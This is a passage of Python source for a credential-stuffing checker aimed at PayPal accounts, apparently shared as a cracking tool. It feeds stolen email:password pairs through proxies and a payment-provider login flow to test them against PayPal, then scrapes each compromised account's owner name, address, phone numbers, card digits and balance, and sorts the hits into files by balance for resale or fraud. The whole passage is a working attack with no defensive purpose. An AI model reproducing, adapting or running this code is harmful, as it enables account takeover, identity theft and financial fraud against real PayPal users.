                        two = f"{two};locale.x=en_EN&amp;country.x=EN&amp;flowId={flowId}"
                        print(two)
                        error+=1
                        sess.close()
                        continue
                url = f"https://www.paypal.com{two}"
                content = f"_csrf={csrf}&_sessionID={sessid}&locale.x=en_US&processSignin=main&fn_sync_data=%257B%2522SC_VERSION%2522%253A%25222.0.1%2522%252C%2522syncStatus%2522%253A%2522data%2522%252C%2522f%2522%253A%25220H4686547F329460Y%2522%252C%2522s%2522%253A%2522UL_CHECKOUT_INPUT_PASSWORD%2522%252C%2522chk%2522%253A%257B%2522ts%2522%253A1662324226617%252C%2522eteid%2522%253A%255B4777945832%252C-7708757522%252C3437077538%252C644956291%252C12761478338%252C-9786720478%252Cnull%252Cnull%255D%252C%2522tts%2522%253A1631%257D%252C%2522dc%2522%253A%2522%257B%255C%2522screen%255C%2522%253A%257B%255C%2522colorDepth%255C%2522%253A24%252C%255C%2522pixelDepth%255C%2522%253A24%252C%255C%2522height%255C%2522%253A990%252C%255C%2522width%255C%2522%253A1760%252C%255C%2522availHeight%255C%2522%253A953%252C%255C%2522availWidth%255C%2522%253A1760%257D%252C%255C%2522ua%255C%2522%253A%255C%2522Mozilla%252F5.0%2520%28Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%253B%2520rv%253A104.0%29%2520Gecko%252F20100101%2520Firefox%252F104.0%255C%2522%257D%2522%252C%2522d%2522%253A%257B%2522ts2%2522%253A%2522Di0%253A2330Ui0%253A212Di1%253A85Di2%253A213Di3%253A59Di4%253A1Ui1%253A24Ui2%253A2Di5%253A67Uh%253A3608%2522%252C%2522rDT%2522%253A%252221036%252C20907%252C20501%253A36411%252C36280%252C35866%253A36417%252C36285%252C35868%253A31299%252C31166%252C30744%253A15934%252C15799%252C15376%253A5695%252C5561%252C5131%253A46681%252C46546%252C46114%253A26202%252C26065%252C25624%253A15965%252C15826%252C15373%253A51838%252C51698%252C51237%253A51849%252C51707%252C51237%253A26245%252C26101%252C25623%253A5765%252C5620%252C5129%253A51895%252C51744%252C51238%253A41660%252C41505%252C40990%253A31430%252C31270%252C30746%253A10947%252C10784%252C10252%253A26333%252C26161%252C25624%253A10969%252C10794%252C10251%253A36592%252C36412%252C35868%253A18208%252C22%2522%257D%257D&otpMayflyKey=c82391bb35444ee9b64cbc0c3b407be4otpChlg&intent=checkout&ads-client-context=checkout&flowId={flowId}&ads-client-context-data={ADS}&ctxId={CTXID}&isValidCtxId=true&coBrand=br&signUpEndPoint=%2Fwebapps%2Fmpp%2Faccount-selection&showCountryDropDown=true&hideOtpLoginCredentials=true&requestUrl=%2Fsignin%3Fintent%3Dcheckout%26ctxId%3Dxo_ctx_0H4686547F329460Y%26returnUri%3D%252Fwebapps%252Fhermes%26state%3D%253Fflow%253D1-P%2526ulReturn%253Dtrue%2526token%253D0H4686547F329460Y%2526rcache%253D1%2526useraction%253DPAY%2526cookieBannerVariant%253Dhidden%2526targetService4174%253Dhermesnodeweb%26locale.x%3Den_ZA%26country.x%3DZA%26flowId%3D0H4686547F329460Y&forcePhonePasswordOptIn=&returnUri=%2Fwebapps%2Fhermes&state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26token%3D0H4686547F329460Y%26rcache%3D1%26useraction%3DPAY%26cookieBannerVariant%3Dhidden%26targetService4174%3Dhermesnodeweb&phoneCode=BR+%2B55&login_email={US}&login_password={PS}&splitLoginContext=inputPassword&isCookiedHybridEmail=true&partyIdHash=0aa4ce0738fe0a40c80a87a8aa1de0365f169c74d98ffc1611ab770ec80cffd0"
                header = {
                    "accept": None,
                    "accept-encoding": None,
                    "accept-language": "en-US;q=0.8",
                    "cache-control": "max-age=0",
                    "content-length": "3277",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://www.paypal.com",
                    "referer": "https://www.paypal.com/webapps/hermes?token=48130089DF483912L&useraction=commit&mfid=1660696218785_f5542781740d0",
                    "sec-fetch-dest": "document",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-user": "?1",
                    "sec-gpc": "1",
                    "upgrade-insecure-requests": "1",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36",
                    "content-type":"application/x-www-form-urlencoded"
                }
                r3 = sess.post(url, headers=header, data=content, allow_redirects=False, proxies=proxy_form, verify=False)
                if "For security reasons, you’ll need" in r3.text or "Some of your info didn't match" in r3.text or "LoginFailed" in r3.text:
                    #a = open(f'results/bads.txt', 'a', encoding='utf-8').write(f"{accounts}:  {r3.text}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
                    bads+=1
                    checked+=1
                    cpm+=1
                    open(f'results/Paypal #1/{current_date}/Bads.txt', 'a', encoding='utf-8').write("{}\n".format(accounts))
                    sess.close()
                    cpmcount()
                    ActualizePaypalCap1()
                    break
                elif  "It looks like you've tried too many times. Try again later, or" in r3.text:
                    bads+=1
                    checked+=1
                    cpm+=1
                    sess.close()
                    break
                elif "Found. Redirecting to /auth/stepup?" in r3.text or "Found. Redirecting to /authflow/safe/?" in r3.text or "Redirecting to <a href=\"/authflow/safe/" in r3.text or "to <a href=\"https://www.paypal.com/authflow/twofactor" in r3.text or "Redirecting to <a href=\"/auth/stepup" in r3.text or "entry" in r3.text:
                    #a = open(f'results/free.txt', 'a', encoding='utf-8').write(f"{accounts}:  {r3.text}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
                    free+=1
                    checked+=1
                    cpm+=1
                    sess.close()
                    cpmcount()
                    ActualizePaypalCap1()
                    custom = email + ":" + password
                    a = open(f'results/Paypal #1/{current_date}/2FA.txt', 'a', encoding='utf-8')
                    a.write("{}\n".format(custom))
                    a.close()
                    break
                elif "You don't have permission to access " in r3.text or "403 Forbidden" in r3.text or "sessionExpired\",\"location\":\"https://www.paypal.com" in r3.text or "We're sorry, we're having some trouble completing " in r3.text or "CSRF token mismatch" in r3.text or "data-app=\"authchallenge_response\" data-captcha-type=\"recaptcha\"" in r3.text:
                    error+=1
                    sess.close()
                    continue
                elif 'Found. Redirecting to <a href="https://www.paypal.com/webapps/hermes?flow=1-P&amp;ulReturn=true&amp;token=EC' in r3.text or "Found. Redirecting to" in r3.text or 'Found. Redirecting to <a href="https://www.paypal.com/connect/?client_id=' in r3.text or 'Found. Redirecting to <a href="https://www.paypal.com/webapps/hermes?flow=1-P&amp;ulReturn=true&amp;token=EC' in r3.text:
                    #a = open(f'results/qpro.txt', 'a', encoding='utf-8').write(f"{accounts} {r3.text}\n")
                    url = "https://www.paypal.com/invoice/s/invoice-model/?template="
                    header = {
                        "accept": "application/json",
                        "accept-encoding": None,
                        "accept-language": "en-US,en;q=0.9",
                        "content-type": "application/json",
                        "referer": "https://www.paypal.com/invoice/s/create",
                        "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"",
                        "sec-ch-ua-mobile": "?0",
                        "sec-ch-ua-platform": "\"Windows\"",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "same-origin",
                        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
                        "x-requested-with": "XMLHttpRequest"
                    }
                    r4 = sess.get(url, headers=header, proxies=proxy_form, verify=False)
                    if "sessionExpired\",\"location\":\"https://www.paypal.com" in r4.text:
                        #a = open(f'results/sessexpired.txt', 'a', encoding='utf-8').write(f"{r4.text}\n")
                        error+=1
                        sess.close()
                        break
                    State = r4.text[r4.text.find('","state":"')+len('","state":"'):r4.text.rfind('","city":"')]
                    State = State[:60]
                    State = State[:State.rfind('","city":"')]
                    first_name = r4.text[r4.text.find('{"first_name":"')+len('{"first_name":"'):r4.text.rfind('","last_name":"')]
                    last_name = r4.text[r4.text.find('","last_name":"')+len('","last_name":"'):r4.text.rfind('","line_1":"')]
                    full_name = f"{first_name} {last_name}"
                    City = r4.text[r4.text.find('","city":"')+len('","city":"'):r4.text.rfind('","postcode":')]
                    City = City[:50]
                    City = City[:City.rfind('","postal_code"')]
                    adress = r4.text[r4.text.find(',{"line1":"')+len(',{"line1":"'):r4.text.rfind('","line2":"",')]
                    adress = adress[:80]
                    adress = adress[:adress.rfind('","line2":"",')]
                    numbers = r4.text
                    count = numbers.count('"national_number":"')
                    number = ""
                    if count == 0:
                        number = "[No Phones]"
                    else:
                        while True:
                            if count <= 0:
                                number = f"[{number}]"
                                break
                            number1 = numbers[numbers.find('"national_number":"')+len('"national_number":"'):numbers.rfind('","phone_type"')]
                            number1 = number1[:40]
                            number1 = number1[:number1.rfind('","phone_type"')]
                            if '","label":"' in number1:
                                number1 = number1[:number1.rfind('","label":"')]
                            numbers.replace(f'"national_number":"', '')
                            if count >= 2:
                                number = f"{number}{number1}, "
                            else:
                                number = f"{number}{number1}"
                            a = 1
                            count = count - a
                    if '","line2' in adress:
                        adress = adress[:adress.rfind('","line2":"')]
                    url = "https://www.paypal.com/myaccount/money/"
                    header = {
                        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/2.3.0 Mobile/15E148",
                        "Pragma": "no-cache",
                        "Accept": None,
                        "Host": "www.paypal.com",
                        "Accept-Language": "en-CA,en-US;q=0.7,en;q=0.3",
                        "Accept-Encoding": None,
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Origin": "https://www.paypal.com",
                        "Connection": "keep-alive",
                        "Upgrade-Insecure-Requests": "1",
                        "Cache-Control": "no-cache"
                    }
                    r5 = sess.get(url, headers=header, verify=False)
                    cards = r5.text
                    count = cards.count('"lastDigits":"')
                    Card = ""
                    if count == 0:
                        Card = "No Cards | "
                    else:
                        while True:
                            if count <= 0:
                                break
                            Card1 = cards[cards.find('"lastDigits":"')+len('"lastDigits":"'):cards.rfind('","productClass":"')]
                            Card1 = Card1[:40]
                            if "productClass" in Card1:
                                Card1 = Card1[:Card1.rfind('","productClass":"')]
                            if f',"bankName":"' in Card1:
                                Card1 = Card1[:Card1.rfind('","bankName":"')]
                                Card2 = cards[cards.find(f',"lastDigits":"{Card1}","bankName":"')+len(f',"lastDigits":"{Card1}","bankName":"'):cards.rfind('","countryCode":"')]
                                Card2 = Card2[:40]
                                if "countryCode" in Card2:
                                    Card2 = Card2[:Card2.rfind('","countryCode":"')]
                                cards.replace(f',"lastDigits":"{Card1}","bankName":"{Card2}', '')
                            else:
                                Card2 = cards[cards.find(f',"lastDigits":"{Card1}","productClass":"')+len(f',"lastDigits":"{Card1}","productClass":"'):cards.rfind('","riskState":"')]
                                Card2 = Card2[:80]
                                if "riskState" in Card2:
                                    Card2 = Card2[:Card2.rfind('","riskState"')]
                                cards.replace(f'","lastDigits":"{Card1}","productClass":"{Card2}', '')
                            Card = f"{Card}[Last Digits: {Card1}, Type: {Card2}] | "
                            a = 1
                            count = count - a
                    Balance = r5.text[r5.text.find('"totalAvailable":{"amount":"')+len('"totalAvailable":{"amount":"'):r5.text.rfind('","currency":"')]
                    Balance = Balance[:60]
                    Balance = Balance[:Balance.rfind('","currency":"')]
                    if float(Balance) > 0:
                        wbalance+=1
                        good = f"{email}:{password} | Full Name: {full_name} | City: {City} | State: {State} | Adress: {adress} | Phone: {number} | Cards: {Card}Balance: [{Balance}$]\n"
                        a = open(f'results/Paypal #1/{current_date}/Hits with balance.txt', 'a', encoding='utf-8').write(good)
                        if float(Balance) < 10:
                            b0to10+=1
                            a = open(f'results/Paypal #1/{current_date}/Below 10$ in balance.txt', 'a', encoding='utf-8').write(good)
                        elif float(Balance) < 50.0:
                            b10to50+=1
                            a = open(f'results/Paypal #1/{current_date}/Below 50$ in balance.txt', 'a', encoding='utf-8').write(good)
                        elif float(Balance) < 100.0:
                            b50to100+=1
                            a = open(f'results/Paypal #1/{current_date}/Below 100$ in balance.txt', 'a', encoding='utf-8').write(good)
                        elif float(Balance) < 500.0:
                            b100to500+=1
                            a = open(f'results/Paypal #1/{current_date}/Below 500$ in balance.txt', 'a', encoding='utf-8').write(good)
                        elif float(Balance) < 1000.0:
                            b500to1000+=1
                            a = open(f'results/Paypal #1/{current_date}/Below 1000$ in balance.txt', 'a', encoding='utf-8').write(good)
                        elif float(Balance) > 1000.0:
                            b1000more+=1
                            a = open(f'results/Paypal #1/{current_date}/Up 1000$ in balance.txt', 'a', encoding='utf-8').write(good)
                    if "No Cards" in Card:
                        nocard+=1
                        good = f"{email}:{password} | Full Name: {full_name} | City: {City} | State: {State} | Adress: {adress} | Phone: {number} | Cards: {Card}Balance: [{Balance}$]\n"
                        a = open(f'results/Paypal #1/{current_date}/Hits without CreditCard.txt', 'a', encoding='utf-8').write(good)
                    else:
                        yescard+=1
                        good = f"{email}:{password} | Full Name: {full_name} | City: {City} | State: {State} | Adress: {adress} | Phone: {number} | Cards: {Card}Balance: [{Balance}$]\n"
                        a = open(f'results/Paypal #1/{current_date}/Hits with CreditCard.txt', 'a', encoding='utf-8').write(good)
                    hits+=1
                    checked+=1
                    cpm+=1
                    cpmcount()
                    ActualizePaypalCap1()
                    good = f"{email}:{password} | Full Name: {full_name} | City: {City} | State: {State} | Adress: {adress} | Phone: {number} | Cards: {Card}Balance: [{Balance}$]\n"
                    a = open(f'results/Paypal #1/{current_date}/Hits.txt', 'a', encoding='utf-8').write(good)
                    sess.close()
                    break
                else:
                    a = open(f'results/log33.txt', 'a', encoding='utf-8').write(f"Erorr: 103 [Normal]\n")
                    error+=1
                    sess.close()
                    continue
            except Exception as e:
                e = str(e).replace("paystation2/api/directpayment?pid=24", "ps").replace("/checkoutnow?token=", "token r2").replace("/pages/redirect?sign=", "pagesredirect")
                a = open(f'results/log.txt', 'a', encoding='utf-8').write(f"{e}\n")
                error+=1
                sess.close()
                continue
def PaypalCap1(accounts):
    global hits, bads, free, checked, error, cpm, num2, flagged, wbalance, b0to10, b10to50, b50to100, b100to500, b500to1000, b1000more, nocard, yescard, expires, AuthCode
    recapretrys = 0
    elseretrys = 0
    sess = requests.session()
    global proxylist, retry
    threads, proxy_type, GUIShowInvalids, GUICensure=load_params()
    Check = True
    try:
        email = accounts.split(":")[0]
        password = accounts.split(":")[1]
    except Exception as e:
        bads+=1
        checked+=1
        Check = False
    if Check:
        while True:
            try:
                threads, proxy_type, GUIShowInvalids, GUICensure=load_params()
                if proxy_type == "http":
                    scheme = "http"
                elif proxy_type == "socks4":
                    scheme = "socks4"
                elif proxy_type == "socks5":
                    scheme = "socks5"
                if not "null" in proxy_type:
                    proxy = random.choice(proxylist)
                    count = proxy.count(":")
                    if count == 3:
                        ip = proxy.split(":")[0]
                        port = proxy.split(":")[1]
                        user = proxy.split(":")[2]
                        passw = proxy.split(":")[3]
                        proxy = f"{user}:{passw}@{ip}:{port}"
                    proxy_form = {'http': f"{scheme}://{proxy}", 'https': f"{scheme}://{proxy}"}
                else:
                    pass
                sess.cookies.clear()
                US = urllib.parse.quote(email)
                PS = urllib.parse.quote(password)
                global ppsessid, ppaccestoken
                #print(ppsessid)
                #print(ppaccestoken)
                url = "https://secure.xsolla.com/paystation2/api/directpayment?pid=24"
                content = f"access_token={ppaccestoken}&pid=24&xps_locale=en&xps_ip=&xps_savePsAccountOnly=&xps_paymentWithSavedMethod=0&xps_mobile=&xps_firstForm=0&xps_ps_custom_data=%7B%22cd20%22%3A%22subscriptionchange%22%7D&xps_dfp=&xps_outCheckType=equals&xps_projectAmountCheckType=equals&xps_paymentType=virtual_currency&xps_sms=%0A%09%09%09%09%0A%09%09%09%09%0A%09%09%09&xps_projectAmount=0&xps_projectCurrency=&xps_zip=10000&xps_fixedContrId=&xps_browserCountry=US&xps_bonusOut=0&xps_idUserSession={ppsessid}&xps_allowSave=0&xps_fix_command=checkout&xps_fix_currency=USD&xps_fix_email=support%2B1%40xsolla.com&xps_fix_out=500&xps_fix_pid=24&xps_fix_project=16184&xps_fix_refer=3&xps_fix_returnUrl=https%3A%2F%2Fsecure.xsolla.com%2Fpaystation3%2Freturn%2F%3Faccess_token%3Deop1ehKgxYNpGDbSJxn1waDV1pjBInuV_en_default_dark%26preferences%3DeyJpdGVtUHJvbW90aW9ucyI6IltdIn0-%26sessional%3DeyJoaXN0b3J5IjpbWyJzdWJzY3JpcHRpb25jaGFuZ2UiXSxbImdpZnRyZWNpcGllbnQiXSxbInNhdmVkbWV0aG9kIl0sWyJsaXN0Iix0cnVlXV19&xps_fix_signed_params=project%2Ccurrency%2Cv1%2Cv2%2Cemail%2CisXsollaLoginAuth%2Cout&xps_fix_userInitialCurrency=USD&xps_fix_userip=186.125.24.227&xps_fix_v1=user_demo&xps_fix_v2=John%20Smith&xps_fix_id_package=&xps_fix_out_stored=500&xps_fix_currency_stored=USD&xps_fix_projectAmount_stored=&xps_fix_originalOut=500&xps_fix_originalProjectAmount=0&xps_fix_isPsPayout=1&xps_fix_idPsAccount=20&xps_fix_purchaseAmount=&xps_fix_isFixedPay=1&xps_fix_externalVatCoverage=&xps_fix_externalTaxCoverage=&xps_fix_xsollaProductTag=&xps_fix_sum=5.99&xps_fix_pricepoints=YTo0OntzOjM6Im91dCI7ZDo1MDA7czoxMzoicHJvamVjdEFtb3VudCI7aTowO3M6NDoicHBpZCI7czo2OiI1MDAuMDAiO3M6NToiY2hlY2siO3M6MzI6ImVkNDQ5YjQwZmM2NmI0MTYzZDI3OWM1N2U3MTA2Y2NiIjt9&xps_signature=20a7edbb9656ceede20f9bf18488b5f0&xps_fixed=command%2Ccurrency%2Cemail%2Cout%2Cpid%2Cproject%2Crefer%2CreturnUrl%2Csigned_params%2CuserInitialCurrency%2Cuserip%2Cv1%2Cv2%2Cproject%2Ccommand%2Cpid%2Cuserip%2Cid_package%2Cout_stored%2Ccurrency_stored%2CprojectAmount_stored%2CoriginalOut%2CoriginalProjectAmount%2CisPsPayout%2CidPsAccount%2CpurchaseAmount%2CisFixedPay%2CexternalVatCoverage%2CexternalTaxCoverage%2CxsollaProductTag%2Cproject%2Ccurrency%2Cv1%2Cv2%2Cemail%2Cout%2Csum%2Cpricepoints%2Csum%2Cpricepoints&xps_braintree_device_data=&xps_dfp_hash=%7B%22200%22%3A%22e5565807ab41077bd97047e9fdd24962c632b1de%22%7D&paymentWithSavedMethod=0&user_session_id={ppsessid}&ps_custom_data=%7B%22cd20%22%3A%22subscriptionchange%22%7D&browserInfo=%7B%22name%22%3A%22Firefox%22%2C%22firefox%22%3Atrue%2C%22version%22%3A%22104.0%22%2C%22gecko%22%3Atrue%2C%22windows%22%3Atrue%2C%22ui_version%22%3A%22desktop%22%7D&os=Windows%2010"
                header = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0",
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Language": "es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Connection": "keep-alive",
                    "Referer": f"https://secure.xsolla.com/paystation4/en/payment/24?token={ppaccestoken}",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                    "Accept-Encoding": None,
                    "Content-Length": "2256"
                }
                r2 = sess.post(url, headers=header, data=content, proxies=proxy_form, allow_redirects=False)
                sign = r2.text[r2.text.find('{"sign":"')+len('{"sign":"'):r2.text.rfind('","url":"')]
                urldat = r2.text[r2.text.find('","url":"')+len('","url":"'):r2.text.rfind('"}},"checkoutToken"')]
                urldat = urldat.replace("\\", "")
                urldat = urllib.parse.quote(urldat)
                sign = urllib.parse.quote(sign)
                url = f"https://secure.xsolla.com/pages/redirect?sign={sign}&url={urldat}"
                header = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US;q=0.5,en;q=0.3",
                    "Connection": "keep-alive",
                    "Referer": f"https://secure.xsolla.com/paystation3/desktop/payment/?access_token={ppaccestoken}&additional=eyJwaWQiOjI0fQ--&preferences=eyJpdGVtUHJvbW90aW9ucyI6IltdIn0-&sessional=eyJoaXN0b3J5IjpbWyJzdWJzY3JpcHRpb25jaGFuZ2UiXSxbImdpZnRyZWNpcGllbnQiXSxbInNhdmVkbWV0aG9kIl0sWyJsaXN0Iix0cnVlXSxbInBheW1lbnQiLHRydWUseyJwaWQiOjI0fV1dfQ--",
                    "Upgrade-Insecure-Requests": "1",
                    "Sec-Fetch-Dest": "document",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Site": "same-origin",
                    "Accept-Encoding": None
                }
                r2 = sess.get(url, proxies=proxy_form, headers=header)
                if not "name=\"_csrf\" value=\"" in r2.text:
                    error+=1
                    sess.close()
                    continue
                """two = r2.text[r2.text.find(".</p></div><form action=\"")+len(".</p></div><form action=\""):r2.text.rfind('" method="post" class="')]
                csrf = r2.text[r2.text.find("name=\"_csrf\" value=\"")+len("name=\"_csrf\" value=\""):r2.text.rfind('"><input type="hidden" id="session" name="_sessio')]
                csrf = urllib.parse.quote(csrf)

                sessid = r2.text[r2.text.find('sessionID" value="')+len('sessionID" value="'):r2.text.rfind('"><input type="hidden" name="locale.')]
                sessid = urllib.parse.quote(sessid)

                flowId = r2.text[r2.text.find('name="flowId" value="')+len('name="flowId" value="'):r2.text.rfind('" /><input type="hidden" name="ads-client-context-dat')]
                five = r2.text[r2.text.find('name="ads-client-context-data" value="')+len('name="ads-client-context-data" value="'):r2.text.rfind('" /><input type="hidden" name="ctxId')]
                ADS = urllib.parse.quote(five)
                CTXID = r2.text[r2.text.find('type="hidden" name="ctxId" value="')+len('type="hidden" name="ctxId" value="'):r2.text.rfind('" /><input type="hidden" name="isValidC')]"""
                two = r2.text[r2.text.find("Please login with your email and password.</p></div><form action=\"")+len("Please login with your email and password.</p></div><form action=\""):r2.text.rfind("\" method=\"post\" class=\"proceed")]
                csrf = r2.text[r2.text.find("name=\"_csrf\" value=\"")+len("name=\"_csrf\" value=\""):r2.text.rfind("\"><input type=\"hidden\" id=\"sessi")]
                csrf = urllib.parse.quote(csrf)
                sessid = r2.text[r2.text.find("name=\"_sessionID\" value=\"")+len("name=\"_sessionID\" value=\""):r2.text.rfind("\"><input type=\"hidden\" name=\"loca")]
                sessid = urllib.parse.quote(sessid)
                flowId = r2.text[r2.text.find("name=\"flowId\" value=\"")+len("name=\"flowId\" value=\""):r2.text.rfind("\" /><input type=\"hidden\" name=\"ads-clien")]
                five = r2.text[r2.text.find("name=\"ads-client-context-data\" value=\"")+len("name=\"ads-client-context-data\" value=\""):r2.text.rfind("\" /><input type=\"hidden\" name=\"ctxI")]
                ADS = urllib.parse.quote(five)
                CTXID = r2.text[r2.text.find("name=\"ctxId\" value=\"")+len("name=\"ctxId\" value=\""):r2.text.rfind("\" /><input type=\"hidden\" name=\"isValidCtx")]
                if "[endif]--" in two:
                    two = r2.text[r2.text.find('<a class=" scTrack:unifiedlogin-footer-language_en_US" href="')+len('<a class=" scTrack:unifiedlogin-footer-language_en_US" href="'):r2.text.rfind('"  lang="en" data-locale="en_US"')]
                    if "><" in two:
                        two = r2.text[r2.text.find('<input type="hidden" name="requestUrl" value="')+len('<input type="hidden" name="requestUrl" value="'):r2.text.rfind('" /><input type="hidden" name="forcePhoneP')]
                        two = two[:two.rfind(";locale.x=")]
                        two = f"{two};locale.x=en_EN&amp;country.x=EN&amp;flowId={flowId}"
                url = f"https://www.paypal.com{two}"
                content = f"_csrf={csrf}&_sessionID={sessid}&locale.x=en_US&processSignin=main&fn_sync_data=%257B%2522SC_VERSION%2522%253A%25222.0.1%2522%252C%2522syncStatus%2522%253A%2522data%2522%252C%2522f%2522%253A%252248130089DF483912L%2522%252C%2522s%2522%253A%2522UL_CHECKOUT_INPUT_PASSWORD%2522%252C%2522chk%2522%253A%257B%2522ts%2522%253A1660696220714%252C%2522eteid%2522%253A%255B615548825%252C10778893016%252C-6101773660%252C536588762%252C-164042729%252C9228186313%252Cnull%252Cnull%255D%252C%2522tts%2522%253A628%257D%252C%2522dc%2522%253A%2522%257B%255C%2522screen%255C%2522%253A%257B%255C%2522colorDepth%255C%2522%253A24%252C%255C%2522pixelDepth%255C%2522%253A24%252C%255C%2522height%255C%2522%253A1024%252C%255C%2522width%255C%2522%253A1280%252C%255C%2522availHeight%255C%2522%253A984%252C%255C%2522availWidth%255C%2522%253A1280%257D%252C%255C%2522ua%255C%2522%253A%255C%2522Mozilla%252F5.0%2520%28Windows%2520NT%252010.0%253B%2520WOW64%29%2520AppleWebKit%252F537.36%2520%28KHTML%252C%2520like%2520Gecko%29%2520Chrome%252F104.0.5112.81%2520Safari%252F537.36%255C%2522%257D%2522%252C%2522d%2522%253A%257B%2522ts2%2522%253A%2522Di0%253A129763Di1%253A181Ui0%253A65Di2%253A208Ui1%253A32Di3%253A256Ui2%253A79Ui3%253A17Di4%253A71Di5%253A96Uh%253A4299%2522%252C%2522rDT%2522%253A%252226193%252C25876%252C25622%253A10823%252C10512%252C10253%253A46682%252C46375%252C46144%253A10814%252C10514%252C10247%253A15928%252C15635%252C15400%253A36416%252C36125%252C35862%253A21045%252C20755%252C20496%253A5673%252C5385%252C5135%253A46654%252C46369%252C46117%253A31280%252C31000%252C30746%253A5660%252C5384%252C5130%253A31270%252C30999%252C30746%253A21016%252C20753%252C20502%253A36377%252C36122%252C35869%253A26121%252C25876%252C25623%253A15864%252C15630%252C15378%253A41467%252C41245%252C40991%253A36333%252C36122%252C35873%253A15830%252C15630%252C15374%253A31189%252C30999%252C30747%253A18156%252C30%2522%257D%257D&otpMayflyKey=40e548d421ef46bea0199bb9a5187bd0otpChlg&intent=checkout&ads-client-context=checkout&flowId={flowId}&ads-client-context-data={ADS}&ctxId={CTXID}&isValidCtxId=true&coBrand=za&signUpEndPoint=%2Fwebapps%2Fmpp%2Faccount-selection&showCountryDropDown=true&hideOtpLoginCredentials=true&requestUrl=%2Fsignin%3Fintent%3Dcheckout%26ctxId%3Dxo_ctx_48130089DF483912L%26returnUri%3D%252Fwebapps%252Fhermes%26state%3D%253Fflow%253D1-P%2526ulReturn%253Dtrue%2526token%253D48130089DF483912L%2526useraction%253Dcommit%2526mfid%253D1660696218785_f5542781740d0%2526rcache%253D1%2526cookieBannerVariant%253D1%2526targetService4174%253Dhermesnodeweb%26locale.x%3Den_US%26country.x%3DUS%26flowId%3D48130089DF483912L&forcePhonePasswordOptIn=&returnUri=%2Fwebapps%2Fhermes&state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26token%3D48130089DF483912L%26useraction%3Dcommit%26mfid%3D1660696218785_f5542781740d0%26rcache%3D1%26cookieBannerVariant%3D1%26targetService4174%3Dhermesnodeweb&phoneCode=US+%2B1&login_email={email}&login_password={password}&splitLoginContext=inputPassword&isCookiedHybridEmail=true&partyIdHash=a2edf8a1745debf0987dd46523aa873c6254804d60ca0f7e68013082db4abf4f"
                header = {
                    "accept": None,
                    "accept-encoding": None,
                    "accept-language": "en-US;q=0.8",
                    "cache-control": "max-age=0",
                    "content-length": str(len(content)),
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://www.paypal.com",
                    "referer": "https://www.paypal.com/webapps/hermes?token=48130089DF483912L&useraction=commit&mfid=1660696218785_f5542781740d0",
                    "sec-fetch-dest": "document",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-user": "?1",
                    "sec-gpc": "1",
                    "upgrade-insecure-requests": "1",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
                }
                r3 = sess.post(url, headers=header, data=content, allow_redirects=False, proxies=proxy_form)
                if "For security reasons, you’ll need" in r3.text or "Some of your info didn't match" in r3.text or "LoginFailed" in r3.text:
                    #a = open(f'results/bads.txt', 'a', encoding='utf-8').write(f"{accounts}:  {r3.text}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
                    bads+=1
                    PrintInvalids(email,password)
                    checked+=1
                    cpm+=1
                    open(f'results/Paypal #1/{current_date}/Bads.txt', 'a', encoding='utf-8').write("{}\n".format(accounts))
                    sess.close()
                    cpmcount()
                    ActualizePaypalCap1()
                    break
                elif  "It looks like you've tried too many times. Try again later, or" in r3.text:
                    bads+=1
                    PrintInvalids(email,password)
                    checked+=1
                    cpm+=1
                    sess.close()
                    break
                elif "Found. Redirecting to /auth/stepup?" in r3.text or "Found. Redirecting to /authflow/safe/?" in r3.text or "Redirecting to <a href=\"/authflow/safe/" in r3.text or "to <a href=\"https://www.paypal.com/authflow/twofactor" in r3.text or "Redirecting to <a href=\"/auth/stepup" in r3.text or "entry" in r3.text:
                    #a = open(f'results/free.txt', 'a', encoding='utf-8').write(f"{accounts}:  {r3.text}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
                    free+=1
                    PrintFree(email, password)
                    checked+=1
                    cpm+=1
                    sess.close()
                    cpmcount()
                    ActualizePaypalCap1()
                    custom = email + ":" + password
                    a = open(f'results/Paypal #1/{current_date}/2FA.txt', 'a', encoding='utf-8')
                    a.write("{}\n".format(custom))
                    a.close()
                    break
                elif "You don't have permission to access " in r3.text or "403 Forbidden" in r3.text or "sessionExpired\",\"location\":\"https://www.paypal.com" in r3.text or "We're sorry, we're having some trouble completing " in r3.text or "CSRF token mismatch" in r3.text or "data-app=\"authchallenge_response\" data-captcha-type=\"recaptcha\"" in r3.text:
                    error+=1
